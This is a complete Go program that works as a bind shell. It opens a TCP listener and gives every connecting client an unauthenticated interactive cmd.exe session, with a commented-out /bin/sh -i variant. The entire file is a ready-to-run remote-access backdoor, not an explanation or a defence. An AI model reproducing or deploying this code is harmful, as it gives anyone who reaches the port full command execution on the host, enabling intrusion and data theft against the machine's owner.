package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

var (
	// Default 0 port means to choose random one
	port = flag.Int("p", 0, "Port")
)

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */

	fmt.Printf("Client Connected...\n")
	cmd := exec.Command("cmd.exe")
	//cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	cmd.Run()
	fmt.Printf("Closing Connection...\n")
	conn.Close()
	fmt.Printf("Connection closed\n")
}

func startServer(port int) {
	// compose server address from host and port
	addr := fmt.Sprintf(":%d", port)

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Errorf("Listener Error: %v\n", err)
		log.Fatalln(err)
	}

	fmt.Printf("Listening at %v... \n", addr)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Errorf("Connection Error: %v\n", err)
			log.Fatalln(err)

		}
		go handle(conn)
	}

}

func main() {
	flag.Parse()

	//serverPort := flag.Arg(0)

	startServer(*port)

}
